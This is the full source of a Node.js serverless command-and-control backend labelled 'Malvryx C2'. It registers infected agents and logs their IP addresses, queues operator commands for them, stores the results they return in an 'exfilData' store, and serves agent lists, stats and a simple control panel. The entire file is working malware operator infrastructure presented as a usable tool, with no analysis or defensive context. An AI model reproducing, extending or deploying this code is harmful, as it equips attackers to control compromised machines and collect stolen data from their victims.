// ================================================================
// MALVRYX C2 — Node.js Serverless Backend
// ================================================================

const agents = {};
const commandQueue = {};
const exfilData = {};

module.exports = async function handler(req, res) {
    // CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Parse body
    let body = {};
    try {
        if (typeof req.body === 'string') {
            body = JSON.parse(req.body);
        } else if (req.body && typeof req.body === 'object') {
            body = req.body;
        }
    } catch (e) {
        body = {};
    }

    const { agent, command, data, agentId, args } = body;
    const path = req.url || '/';

    console.log('[REQUEST]', { path, method: req.method, body });

    // ============================================================
    // POLL ENDPOINT — Agent registration, polling, results
    // ============================================================
    if (path === '/poll' && req.method === 'POST') {
        // Register
        if (command === 'register') {
            const id = agent || 'agent_' + Date.now().toString(36);
            agents[id] = {
                id,
                info: data || {},
                lastSeen: Date.now(),
                firstSeen: Date.now(),
                ip: req.headers['x-forwarded-for'] || 'unknown',
                commandsExecuted: 0
            };
            if (!commandQueue[id]) commandQueue[id] = [];
            console.log('[REGISTER]', id);
            return res.json({ status: 'registered', agentId: id });
        }

        // Poll for commands
        if (command === 'poll') {
            const id = agent;
            if (!agents[id]) {
                return res.json({ error: 'Agent not found: ' + id });
            }
            agents[id].lastSeen = Date.now();
            if (commandQueue[id] && commandQueue[id].length > 0) {
                const cmd = commandQueue[id].shift();
                agents[id].commandsExecuted++;
                console.log('[POLL]', id, '→', cmd.command);
                return res.json(cmd);
            }
            return res.json({ command: 'noop' });
        }

        // Send result
        if (command === 'result' || command === 'error') {
            const id = agent;
            if (agents[id]) {
                if (!exfilData[id]) exfilData[id] = [];
                exfilData[id].push({ time: Date.now(), type: command, data });
                console.log('[RESULT]', id, '→', (data || '').substring(0, 50));
            }
            return res.json({ status: 'ok' });
        }

        return res.status(400).json({ error: 'Unknown poll command: ' + command });
    }

    // ============================================================
    // API: GET /api/agents
    // ============================================================
    if (path === '/api/agents' && req.method === 'GET') {
        const list = Object.keys(agents).map(id => ({
            id,
            info: agents[id].info,
            lastSeen: agents[id].lastSeen,
            ip: agents[id].ip,
            commandsExecuted: agents[id].commandsExecuted,
            online: (Date.now() - agents[id].lastSeen) < 60000
        }));
        console.log('[AGENTS]', list.length);
        return res.json(list);
    }

    // ============================================================
    // API: POST /api/send
    // ============================================================
    if (path === '/api/send' && req.method === 'POST') {
        console.log('[SEND]', body);

        if (!agentId) {
            return res.status(400).json({ error: 'agentId is required' });
        }
        if (!command) {
            return res.status(400).json({ error: 'command is required' });
        }
        if (!agents[agentId]) {
            return res.status(404).json({ error: 'Agent not found: ' + agentId });
        }

        if (!commandQueue[agentId]) commandQueue[agentId] = [];
        commandQueue[agentId].push({ command, data, args });

        return res.json({
            status: 'queued',
            agentId: agentId,
            command: command,
            queueLength: commandQueue[agentId].length
        });
    }

    // ============================================================
    // API: GET /api/stats
    // ============================================================
    if (path === '/api/stats' && req.method === 'GET') {
        const total = Object.keys(agents).length;
        const online = Object.keys(agents).filter(id => (Date.now() - agents[id].lastSeen) < 60000).length;
        const commands = Object.keys(agents).reduce((sum, id) => sum + agents[id].commandsExecuted, 0);
        return res.json({
            totalAgents: total,
            onlineAgents: online,
            totalCommands: commands,
            uptime: process.uptime()
        });
    }

    // ============================================================
    // HTML Panel (Optional)
    // ============================================================
    if (path === '/' || path === '') {
        // Redirect to public/index.html or serve the panel
        // Vercel will serve public/index.html automatically
        return res.status(200).send(`
            <h1>Malvryx C2 Server</h1>
            <p>Server is running.</p>
            <ul>
                <li><a href="/api/stats">/api/stats</a></li>
                <li><a href="/api/agents">/api/agents</a></li>
            </ul>
            <p>Open the panel at: <a href="/">/</a></p>
        `);
    }

    // ============================================================
    // 404
    // ============================================================
    console.log('[404]', { path, method: req.method });
    res.status(404).json({
        error: 'Not found',
        path: path,
        method: req.method
    });
};
